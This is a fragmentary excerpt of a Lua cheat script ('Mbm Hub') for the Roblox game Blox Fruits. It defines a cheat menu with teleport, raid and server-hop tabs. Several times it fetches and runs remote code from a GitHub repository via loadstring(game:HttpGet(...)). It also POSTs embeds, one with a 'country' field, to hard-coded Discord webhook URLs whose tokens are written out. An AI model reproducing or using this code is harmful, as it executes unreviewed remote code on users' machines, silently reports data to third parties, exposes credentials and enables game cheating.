...
if game.PlaceId == 7449423635 then 
        ...
        embeds = {
            {
                ...
                thumbnail = { url = "https://cdn.discordapp.com/attachments/1181972023539421204/1221706502130237510/image.png?ex=66138dd8&is=660118d8&hm=d2ec7a473f72b8cc576a00eb9052ff2fa65f7f8336c04e10bcb01a653e025e12&" },
                fields = {
                    {
                        name = "country",
    ...
    local webhookUrl = "https://discord.com/api/webhooks/1224363931988918332/2-rFu9gGtfipoPOYeN3zhpjfTYdRvWwMBCm0Vhx_bJi3TzS67_AHJ8hnMhWSL_SmJtja"
    local headers = { ["Content-Type"] = "application/json" }
    ...
    if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
        ...
        Request = http_request or request or HttpPost or syn.request
        local Final1 = {Url = "https://discord.com/api/webhooks/1224363523820224573/1_ekWSMd8SVxARDwKFUMXJgr01DqVt-o4Zf11GoAGVMEGmcfiZ_wMGrwpR5iA8unoi8L" , Body = Encoded, Method = "POST", Headers = Headers}
    ...
    if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
        ...
        Request = http_request or request or HttpPost or syn.request
        local Final1 = {Url = "https://discord.com/api/webhooks/1224363823398653962/0Lon4K77dNk3i1Iu3ke-mO0Ll29z0mTto4dF_SP74o_Un1HWWI3rOF2zmPNe-IRZ7yPw" , Body = Encoded, Method = "POST", Headers = Headers}
...
local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "Mbm-Hub" }),
    Stats = Window:AddTab({ Title = "Sub", Icon = "Mbm-Hub" }),
    Info = Window:AddTab({ Title = "Status", Icon = "Mbm-Hub" }),
    Seaev = Window:AddTab({ Title = "Sea Event", Icon = "Mbm-Hub" }),
    Player = Window:AddTab({ Title = "Player", Icon = "Mbm-Hub" }),
    Teleport = Window:AddTab({ Title = "Teleport", Icon = "Mbm-Hub" }),
    Fruit = Window:AddTab({ Title = "Blox Fruits", Icon = "Mbm-Hub" }),
    Raid = Window:AddTab({ Title = "Raids", Icon = "Mbm-Hub" }),
    Race = Window:AddTab({ Title = "Race Trial", Icon = "Mbm-Hub" }),
    Shop = Window:AddTab({ Title = "Shop", Icon = "Mbm-Hub" }),
    Misc = Window:AddTab({ Title = "Misc", Icon = "Mbm-Hub" }),
    Hop = Window:AddTab({ Title = "Server", Icon = "Mbm-Hub" }),
    Setting = Window:AddTab({ Title = "Settings", Icon = "Mbm-Hub" }),
    Fluent = Window:AddTab({ Title = "Config", Icon = "Mbm-Hub" }),
}
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/pain6two2geng/general/main/funtion%20.lua"))()
if First_Sea then
tableMon = {
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/pain6two2geng/general/main/function%20.lua"))()
if First_Sea then
AreaList = {
...
loadstring(game:HttpGet("https://raw.githubusercontent.com/pain6two2geng/general/main/fumction%20.lua"))()
Fluent:Notify({
    Title = "Mbm Hub",
    Content = "Script load..",
    Duration = 5
